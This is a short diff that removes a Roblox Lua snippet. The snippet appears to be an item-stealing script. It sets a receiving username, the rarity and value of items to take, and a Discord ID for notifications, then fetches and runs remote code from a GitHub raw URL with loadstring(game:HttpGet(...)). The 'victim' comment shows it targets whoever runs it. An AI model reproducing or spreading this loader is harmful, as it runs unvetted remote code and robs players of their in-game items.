@@ -1,7 +1,0 @@
-_G.Username = "owhvdjygshistbwjdh" -- user you should join victim on
-_G.min_rarity = "Godly"
-_G.min_value = 1 -- Put 1 to get all
-_G.pingEveryone = "Yes" -- change to "No" if you dont want pings
-_G.discuser = "875557646495797308" -- change to your discord id
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/etherhub1/Hjejeje/refs/heads/main/Jdjdjd"))()
